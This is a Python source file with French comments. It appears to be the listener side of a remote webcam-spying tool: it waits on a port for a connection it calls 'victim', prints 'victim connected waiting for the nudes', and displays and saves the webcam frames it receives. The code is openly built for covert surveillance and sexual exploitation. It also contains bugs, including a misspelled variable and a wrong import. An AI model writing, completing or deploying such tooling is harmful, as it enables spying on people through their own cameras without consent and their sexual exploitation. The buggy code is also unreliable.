import socket
import os
import cv2
import base64
import np
import time

def afficher_un_recu(socket):
    buffer = vitcim.recv(234234324)
    jpg = base64.b64decode(buffer)      #on dechiffre le base64 en jpg

    np_jpg = np.frombuffer(jpg, dtype=np.uint8)    #bout de code mystere (il faut faire pip install np et pas oublié de l'import)(en vrai il converti la string en jpg puis fait un tas d'opératon technique pour revenir au buffer de base mais chute)
    frame = cv2.imdecode(np_jpg, flags=1)       #converti le jpg np en buffer
    
    while True:
        cv2.imshow('img1',frame) #ouvre la fenetre pour afficher l'image
        if(cv2.waitKey(1) & 0xFF == ord('y')): #permet de sauvegarder et quité en appuiyant sur y
            print("image save as capture1.png")
            cv2.imwrite('capture1.png',frame)
            cv2.destroyAllWindows()
            break
        #return pas besoin de return wtf

def recupImg(client):
    buffer = base64.b64decode(client.recv(234234324))
    np_jpg = np.frombuffer(buffer, dtype=np.uint8)
    return cv2.imdecode(np_jpg, flags=1)
    

def cam_streaming(socket):
    while True:
        try:
            cv2.imshow('live remote webcam',recupImg(socket))
            cv2.waitKey(1)
            cv2.destroyAllWindows()
            
        except:
            print("error")

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.bind(('', 7009))
socket.listen()
print("server started ...")
victim, info_co = socket.accept()

print("victim connected waiting for the nudes")

cam_streaming(victim)







